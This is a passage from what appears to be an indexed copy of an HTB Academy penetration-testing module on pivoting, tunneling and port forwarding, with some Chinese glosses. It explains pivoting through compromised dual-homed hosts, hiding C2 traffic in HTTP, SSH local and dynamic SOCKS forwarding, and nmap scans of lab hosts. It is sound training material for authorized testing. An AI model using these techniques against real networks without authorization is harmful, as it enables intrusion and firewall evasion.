further.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#pivoting","title":"Pivoting","text":"<p>Utilizing multiple hosts to cross <code>network</code> boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.</p> <p>One practical example of <code>Pivoting</code> would be:</p> <p>During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#tunneling","title":"Tunneling","text":"<p>We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. For example, using HTTP to mask our Command &amp; Control traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid detection for as long as possible. We utilize protocols with enhanced security measures such as HTTPS over TLS or SSH over other transport protocols. These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.</p> <p>One practical example of <code>Tunneling</code> would be:</p> <p>One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.</p> <p>To summarize, we should look at these tactics as separate things. Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments. Keep this comparison in mind while moving through this module.</p> <p>Now that we have been introduced to the module and have defined and compared Lateral Movement, Pivoting, and Tunneling, let's dive into some of the networking concepts that enable us to perform these tactics.</p> <p>Pivoting: \u901a\u8fc7\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u79fb\u52a8\u5230\u5176\u4ed6\u7f51\u7edc\uff0c\u4ee5\u5728\u4e0d\u540c\u7684\u7f51\u6bb5\u4e0a\u627e\u5230\u66f4\u591a\u7684\u76ee\u6807\u3002</p> <p><code>Lateral Movement</code>: \u4e00\u79cd\u6280\u672f\uff0c\u7528\u4e8e\u8fdb\u4e00\u6b65\u8bbf\u95ee\u7f51\u7edc\u73af\u5883\u4e2d\u7684\u5176\u4ed6\u4e3b\u673a\u3001\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u3002</p> <p><code>Tunneling</code> </p> <p>\u63cf\u8ff0\u53d7\u611f\u67d3\u7684\u4e3b\u673a</p> <p>Pivot Host(\u65cb\u8f6c\u673a)</p> <p>Proxy(\u4ee3\u7406)</p> <p>Foothold(\u7acb\u8db3\u70b9)</p> <p>Beach Head system(\u6ee9\u5934\u7cfb\u7edf)</p> <p>Jump Host(\u8df3\u677f\u673a)</p> <p>Pivoting \u7684\u4e3b\u8981\u7528\u9014\u662f\u6253\u7834\u5206\u9694(\u5728\u7269\u7406\u548c\u865a\u62df\u4e4b\u95f4)\u4ee5\u8bbf\u95ee\u9694\u79bb\u7f51\u7edc</p> <p>Tunneling \u662f Pivoting \u7684\u4e00\u4e2a\u5b50\u9879(subset)\uff0c\u5c06\u7f51\u7edc\u6d41\u91cf\u5c01\u88c5\u5230\u53e6\u4e00\u4e2a\u534f\u8bae\u4e2d\u5e76\u901a\u8fc7\u5b83\u8def\u7531\u6d41\u91cf</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#the-networking-behind-pivoting","title":"The Networking Behind Pivoting","text":"<p>Being able to grasp the concept of <code>pivoting</code> well enough to succeed at it on an engagement requires a solid fundamental understanding of some key networking concepts. This section will be a quick refresher on essential foundational networking concepts to understand pivoting.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ip-addressing-nics","title":"IP Addressing &amp; NICs","text":"<p>Every computer that is communicating on a network needs an IP address. If it doesn't have one, it is not on a network. The IP address is assigned in software and usually obtained automatically from a DHCP server. It is also common to see computers with statically assigned IP addresses. Static IP assignment is common with:</p> <ul> <li>Servers</li> <li>Routers</li> <li>Switch virtual interfaces</li> <li>Printers</li> <li>And any devices that are providing critical services to the network</li> </ul> <p>Whether assigned <code>dynamically</code> or <code>statically</code>, the IP address is assigned to a <code>Network Interface Controller</code> (<code>NIC</code>). Commonly, the NIC is referred to as a <code>Network Interface Card</code> or <code>Network Adapter</code>. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach. This is why it is important for us to always check for additional NICs using commands like <code>ifconfig</code> (in macOS and Linux) and <code>ipconfig</code> (in Windows).</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-ifconfig","title":"Using ifconfig","text":"<p>Using ifconfig</p> <pre><code>darkinga@htb[/htb]$ ifconfig\n\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 134.122.100.200  netmask 255.255.240.0  broadcast 134.122.111.255\n        inet6 fe80::e973:b08d:7bdf:dc67  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 12:ed:13:35:68:f5  txqueuelen 1000  (Ethernet)\n        RX packets 8844  bytes 803773 (784.9 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 5698  bytes 9713896 (9.2 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\neth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.106.0.172  netmask 255.255.240.0  broadcast 10.106.15.255\n        inet6 fe80::a5bf:1cd4:9bca:b3ae  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 4e:c7:60:b0:01:8d  txqueuelen 1000  (Ethernet)\n        RX packets 15  bytes 1620 (1.5 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 18  bytes 1858 (1.8 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 19787  bytes 10346966 (9.8 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 19787  bytes 10346966 (9.8 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\ntun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500\n        inet 10.10.15.54  netmask 255.255.254.0  destination 10.10.15.54\n        inet6 fe80::c85a:5717:5e3a:38de  prefixlen 64  scopeid 0x20&lt;link&gt;\n        inet6 dead:beef:2::1034  prefixlen 64  scopeid 0x0&lt;global&gt;\n        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 7  bytes 336 (336.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>In the output above, each NIC has an identifier (<code>eth0</code>, <code>eth1</code>, <code>lo</code>, <code>tun0</code>) followed by addressing information and traffic statistics. The tunnel interface (tun0) indicates a VPN connection is active. When we connect to any of HTB's VPN servers through Pwnbox or our own attack host, we will always notice a tunnel interface gets created and assigned an IP address. The VPN allows us to access the lab network environments hosted by HTB. Keep in mind that these lab networks are not reachable without having a tunnel established. The VPN encrypts traffic and also establishes a tunnel over a public network (often the Internet), through <code>NAT</code> on a public-facing network appliance, and into the internal/private network. Also, notice the IP addresses assigned to each NIC. The IP assigned to eth0 (<code>134.122.100.200</code>) is a publicly routable IP address. Meaning ISPs will route traffic originating from this IP over the Internet. We will see public IPs on devices that are directly facing the Internet, commonly hosted in DMZs. The other NICs have private IP addresses, which are routable within internal networks but not over the public Internet. At the time of writing, anyone that wants to communicate over the Internet must have at least one public IP address assigned to an interface on the network appliance that connects to the physical infrastructure connecting to the Internet. Recall that NAT is commonly used to translate private IP addresses to public IP addresses.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-ipconfig","title":"Using ipconfig","text":"<p>Using ipconfig</p> <pre><code>PS C:\\Users\\htb-student&gt; ipconfig\n\nWindows IP Configuration\n\nUnknown adapter NordLynx:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . :\n\nEthernet adapter Ethernet0 2:\n\n   Connection-specific DNS Suffix  . : .htb\n   IPv6 Address. . . . . . . . . . . : dead:beef::1a9\n   IPv6 Address. . . . . . . . . . . : dead:beef::f58b:6381:c648:1fb0\n   Temporary IPv6 Address. . . . . . : dead:beef::dd0b:7cda:7118:3373\n   Link-local IPv6 Address . . . . . : fe80::f58b:6381:c648:1fb0%8\n   IPv4 Address. . . . . . . . . . . : 10.129.221.36\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:df81%8\n                                       10.129.0.1\n\nEthernet adapter Ethernet:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . :\n</code></pre> <p>The output directly above is from issuing <code>ipconfig</code> on a Windows system. We can see that this system has multiple adapters, but only one of them has IP addresses assigned. There are IPv6 addresses and an IPv4 address. This module will primarily focus on networks running IPv4 as it remains the most common IP addressing mechanism in enterprise LANs. We will notice some adapters, like the one in the output above, will have an IPv4 and an IPv6 address assigned in a dual-stack configuration allowing resources to be reached over IPv4 or IPv6.</p> <p>Every IPv4 address will have a corresponding <code>subnet mask</code>. If an IP address is like a phone number, the subnet mask is like the area code. Remember that the subnet mask defines the <code>network</code> &amp; <code>host</code> portion of an IP address. When network traffic is destined for an IP address located in a different network, the computer will send the traffic to its assigned <code>default gateway</code>. The default gateway is usually the IP address assigned to a NIC on an appliance acting as the router for a given LAN. In the context of pivoting, we need to be mindful of what networks a host we land on can reach, so documenting as much IP addressing information as possible on an engagement can prove helpful.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#routing","title":"Routing","text":"<p>It is common to think of a network appliance that connects us to the Internet when thinking about a router, but technically any computer can become a router and participate in routing. Some of the challenges we will face in this module require us to make a pivot host route traffic to another network. One way we will see this is through the use of AutoRoute, which allows our attack box to have <code>routes</code> to target networks that are reachable through a pivot host. One key defining characteristic of a router is that it has a routing table that it uses to forward traffic based on the destination IP address. Let's look at this on Pwnbox using the commands <code>netstat -r</code> or <code>ip route</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#routing-table-on-pwnbox","title":"Routing Table on Pwnbox","text":"<p>Routing Table on Pwnbox</p> <pre><code>darkinga@htb[/htb]$ netstat -r\n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface\ndefault         178.62.64.1     0.0.0.0         UG        0 0          0 eth0\n10.10.10.0      10.10.14.1      255.255.254.0   UG        0 0          0 tun0\n10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0\n10.106.0.0      0.0.0.0         255.255.240.0   U         0 0          0 eth1\n10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0\n178.62.64.0     0.0.0.0         255.255.192.0   U         0 0          0 eth0\n</code></pre> <p>We will notice that Pwnbox, Linux distros, Windows, and many other operating systems have a routing table to assist the system in making routing decisions. When a packet is created and has a destination before it leaves the computer, the routing table is used to decide where to send it. For example, if we are trying to connect to a target with the IP <code>10.129.10.25</code>, we could tell from the routing table where the packet would be sent to get there. It would be forwarded to a <code>Gateway</code> out of the corresponding NIC (<code>Iface</code>). Pwnbox is not using any routing protocols (EIGRP, OSPF, BGP, etc...) to learn each of those routes. It learned about those routes via its own directly connected interfaces (eth0, eth1, tun0). Stand-alone appliances designated as routers typically will learn routes using a combination of static route creation, dynamic routing protocols, and directly connected interfaces. Any traffic destined for networks not present in the routing table will be sent to the <code>default route</code>, which can also be referred to as the default gateway or gateway of last resort. When looking for opportunities to pivot, it can be helpful to look at the hosts' routing table to identify which networks we may be able to reach or which routes we may need to add.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#protocols-services-ports","title":"Protocols, Services &amp; Ports","text":"<p><code>Protocols</code> are the rules that govern network communications. Many protocols and services have corresponding <code>ports</code> that act as identifiers. Logical ports aren't physical things we can touch or plug anything into. They are in software assigned to applications. When we see an IP address, we know it identifies a computer that may be reachable over a network. When we see an open port bound to that IP address, we know that it identifies an application we may be able to connect to. Connecting to specific ports that a device is <code>listening</code> on can often allow us to use ports &amp; protocols that are <code>permitted</code> in the firewall to gain a foothold on the network.</p> <p>Let's take, for example, a web server using HTTP (<code>often listening on port 80</code>). The administrators should not block traffic coming inbound on port 80. This would prevent anyone from visiting the website they are hosting. This is often a way into the network environment, <code>through the same port that legitimate traffic is passing</code>. We must not overlook the fact that a <code>source port</code> is also generated to keep track of established connections on the client-side of a connection. We need to remain mindful of what ports we are using to ensure that when we execute our payloads, they connect back to the intended listeners we set up. We will get creative with the use of ports throughout this module.</p> <p>For further review of fundamental networking concepts, please reference the module Introduction to Networking.</p> <p>A tip from LTNB0B: In this module, we will practice many different tools and techniques to pivot through hosts and forward local or remote services to our attack host to access targets connected to different networks. This module gradually increases in difficulty, providing multi-host networks to practice what is learned. I strongly encourage you to practice many different methods in creative ways as you start to understand the concepts. Maybe even try to draw out the network topologies using network diagramming tools as you face challenges. When I am looking for opportunities to pivot, I like to use tools like Draw.io to build a visual of the network environment I am in, it serves as a great documentation tool as well. This module is a lot of fun and will put your networking skills to the test. Have fun, and never stop learning!</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#choosing-the-dig-site-starting-our-tunnels","title":"Choosing The Dig Site &amp; Starting Our Tunnels","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#dynamic-port-forwarding-with-ssh-and-socks-tunneling","title":"Dynamic Port Forwarding with SSH and SOCKS Tunneling","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#port-forwarding-in-context","title":"Port Forwarding in Context","text":"<p><code>Port forwarding</code> is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even SOCKS (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ssh-local-port-forwarding","title":"SSH Local Port Forwarding","text":"<p>Let's take an example from the below image.</p> <p></p> <p>Note: Each network diagram presented in this module is designed to illustrate concepts discussed in the associated section. The IP addressing shown in the diagrams will not always match the lab environments exactly. Be sure to focus on understanding the concept, and you will find the diagrams will prove very useful! After reading this section be sure to reference the above image again to reinforce the concepts.</p> <p>We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#scanning-the-pivot-target","title":"Scanning the Pivot Target","text":"<p>Scanning the Pivot Target</p> <pre><code>darkinga@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST\nNmap scan report for 10.129.202.64\nHost is up (0.12s latency).\n\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n3306/tcp closed mysql\n\nNmap done: 1 IP address (1 host up) scanned in 0.68 seconds\n</code></pre> <p>The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port <code>1234</code> and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port <code>3306</code>. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#executing-the-local-port-forward","title":"Executing the Local Port Forward","text":"<p>Executing the Local Port Forward</p> <pre><code>darkinga@htb[/htb]$ ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64\n\nubuntu@10.129.202.64's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu 24 Feb 2022 05:23:20 PM UTC\n\n  System load:             0.0\n  Usage of /:              28.4% of 13.72GB\n  Memory usage:            34%\n  Swap usage:              0%\n  Processes:               175\n  Users logged in:         1\n  IPv4 address for ens192: 10.129.202.64\n  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb\n  IPv4 address for ens224: 172.16.5.129\n\n * Super-optimized for small spaces - read how we shrank the memory\n   footprint of MicroK8s to make it the smallest full K8s around.\n\n   https://ubuntu.com/blog/microk8s-memory-optimisation\n\n66 updates can be applied immediately.\n45 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n</code></pre> <p>The <code>-L</code> command tells the SSH client to request the SSH server to forward all the data we send via the port <code>1234</code> to <code>localhost:3306</code> on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#confirming-port-forward-with-netstat","title":"Confirming Port Forward with Netstat","text":"<p>Confirming Port Forward with Netstat</p> <pre><code>darkinga@htb[/htb]$ netstat -antp | grep 1234\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\ntcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            \ntcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh     \n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#confirming-port-forward-with-nmap","title":"Confirming Port Forward with Nmap","text":"<p>Confirming Port Forward with Nmap</p> <pre><code>darkinga@htb[/htb]$ nmap -v -sV -p1234 localhost\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST\nNSE: Loaded 45 scripts for scanning.\nInitiating Ping Scan at 12:18\nScanning localhost (127.0.0.1) [2 ports]\nCompleted Ping Scan at 12:18, 0.01s elapsed (1 total hosts)\nInitiating Connect Scan at 12:18\nScanning localhost (127.0.0.1) [1 port]\nDiscovered open port 1234/tcp on 127.0.0.1\nCompleted Connect Scan at 12:18, 0.01s elapsed (1 total ports)\nInitiating Service scan at 12:18\nScanning 1 service on localhost (127.0.0.1)\nCompleted Service scan at 12:18, 0.12s elapsed (1 service on 1 host)\nNSE: Script scanning 127.0.0.1.\nInitiating NSE at 12:18\nCompleted NSE at 12:18, 0.01s elapsed\nInitiating NSE at 12:18\nCompleted NSE at 12:18, 0.00s elapsed\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.0080s latency).\nOther addresses for localhost (not scanned): ::1\n\nPORT     STATE SERVICE VERSION\n1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.18 seconds\n</code></pre> <p>Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the <code>local port:server:port</code> argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on <code>8080</code>.</p> <p>Confirming Port Forward with Nmap</p> <pre><code>darkinga@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#setting-up-to-pivot","title":"Setting up to Pivot","text":"<p>Now, if you type <code>ifconfig</code> on the Ubuntu host, you will find that this server has multiple NICs:</p> <ul> <li>One connected to our attack host (<code>ens192</code>)</li> <li>One communicating to other hosts within a different network (<code>ens224</code>)</li> <li>The loopback interface (<code>lo</code>).</li> </ul>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#looking-for-opportunities-to-pivot-using-ifconfig","title":"Looking for Opportunities to Pivot using ifconfig","text":"<p>Looking for Opportunities to Pivot using ifconfig</p> <pre><code>ubuntu@WEB01:~$ ifconfig \n\nens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255\n        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0&lt;global&gt;\n        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)\n        RX packets 35571  bytes 177919049 (177.9 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 10452  bytes 1474767 (1.4 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255\n        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)\n        RX packets 8251  bytes 1125190 (1.1 MB)\n        RX errors 0  dropped 40  overruns 0  frame 0\n        TX packets 1538  bytes 123584 (123.5 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 270  bytes 22432 (22.4 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 270  bytes 22432 (22.4 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (<code>172.16.5.1-200</code>) network or the entire subnet (<code>172.16.5.0/23</code>). We cannot perform this scan directly from our attack host because it does not have routes to the <code>172.16.5.0/23</code> network. To do this, we will have to perform <code>dynamic port forwarding</code> and <code>pivot</code> our network packets via the Ubuntu server. We can do this by starting a <code>SOCKS listener</code> on our <code>local host</code> (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.</p> <p>This is called <code>SSH tunneling</code> over <code>SOCKS proxy</code>. SOCKS stands for <code>Socket Secure</code>, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.</p> <p>This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from <code>NAT networks</code>. SOCKS proxies are currently of two types: <code>SOCKS4</code> and <code>SOCKS5</code>. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.</p> <p></p> <p>In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on <code>localhost:9050</code>. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH. We can use the below command to perform this dynamic port forwarding.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#enabling-dynamic-port-forwarding-with-ssh","title":"Enabling Dynamic Port Forwarding with SSH","text":"<p>Enabling Dynamic Port Forwarding with SSH</p> <pre><code>darkinga@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64\n</code></pre> <p>The <code>-D</code> argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port <code>9050</code>. We can do this using the tool <code>proxychains</code>, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's <code>TCP traffic</code> to go through hosted proxies like <code>SOCKS4</code>/<code>SOCKS5</code>, <code>TOR</code>, or <code>HTTP</code>/<code>HTTPS</code> proxies.</p> <p>To inform proxychains that we must use port 9050, we must modify the proxychains 